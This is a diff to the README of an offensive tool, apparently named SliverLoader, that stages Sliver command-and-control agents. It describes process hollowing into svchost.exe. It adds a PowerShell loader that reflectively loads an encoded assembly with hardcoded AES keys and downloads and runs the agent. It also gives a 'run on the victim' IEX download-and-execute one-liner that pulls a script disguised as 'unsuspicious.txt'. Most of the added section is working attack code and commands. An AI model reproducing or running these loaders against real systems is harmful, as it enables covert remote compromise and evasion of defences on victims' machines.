@@ -38,7 +38,7 @@ sliver > stage-listener --url https://192.168.8.205:8443 --profile monkeybox -c 
 sliver > jobs
 ```
 
-![Setup Sliver lister and stager](./doc/img/sliver001.png "Setup Sliver lister and stager")
+![Setup Sliver lister and stager](./doc/img/sliver001.png)
 
 ## Shellcode Runner
 
@@ -144,3 +144,47 @@ public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
 Process hollowing is accomplished by injecting shellcode into a process that ideally also generates network traffic to remain more covert. The implementation follows a basic pattern using Win32 APIs such as CreateProcessA, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread to inject the code into processes like svchost.exe.
 
 Conditional operations were added to separate different workflows and to allow passing parameters to various methods. The final source code is implemented in the file [Loader.cs](https://github.com/Cyb3rDudu/SliverLoader/blob/main/SliverLoader/Loader.cs).
+
+## Powershell Loader
+
+The loader is a PowerShell script hosted on a web server, intended to be downloaded and executed once the attacker gains code execution. The script then loads the stager into memory via reflection and performs the download and execution of the agent from the staging server. 
+
+To create the loader, the following steps are neccesarry:
+
+First, the raw bytes of the assembly will need to be copied. For this, a PowerShell command will be used, which will copy the data to the clipboard.
+
+```powershell
+get-content -encoding byte -path .\sliverloader.dll | clip
+```
+
+Next use [CyberChef](https://cyberchef.io) to convert the data to base64. Convert "From Decimal" with delimiter Line feed "To Base64"
+
+![Convert assembly to base64](./doc/img/cyberchef001.png)
+
+As powershell doesn't support **Raw Byte Encoding** which **Sliver C2** expects for **AES Encryption** and hardcoded keys in the assembly are not an option, they keys have to be converted with external tools like Cyberchef again.
+
+![Convert key to hex](./doc/img/cyberchef002.png)
+
+Finally coppy the converted values to the script as in [loader.ps1](https://github.com/Cyb3rDudu/SliverLoader/blob/main/loader.ps1).
+
+```powershell
+$encodeStr = "TVqQAAMAAAAEAAAA..."
+
+$decodeStr = [System.Convert]::FromBase64String($encodeStr)
+[System.Reflection.Assembly]::Load($decodeStr)
+$url = "https://192.168.X.X:8443/test.woff"
+$TargetBinary = "svchost.exe"
+[byte[]]$AESKey = 0x44,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56,0x6d,0x59,0x71,0x33,0x74,0x36,0x76,0x39,0x79,0x24,0x42,0x26,0x45,0x29,0x48,0x40,0x4d,0x63,0x51,0x66,0x54
+[byte[]]$AESIV = 0x38,0x79,0x2f,0x42,0x3f,0x45,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56
+
+$CompressionAlgorithm = "deflate9"
+[Sl1verLoader.Program]::DownloadAndExecute($url,$TargetBinary,$CompressionAlgorithm,$AESKey,$AESIV)
+```
+## Deployment
+
+The powershell loader is hosted on a webserver as `.txt` file e.g. `unsuspicious.txt`.
+On the victim, the following command executes the download and staging of the agent which will result in an incoming session in sliver.
+```Powershell
+(New-Object System.Net.WebClient).DownloadString('https://some-server/unsuspicious.txt') | IEX)
+```
+![Catch the session with sliver](./doc/img/sliver002.png)
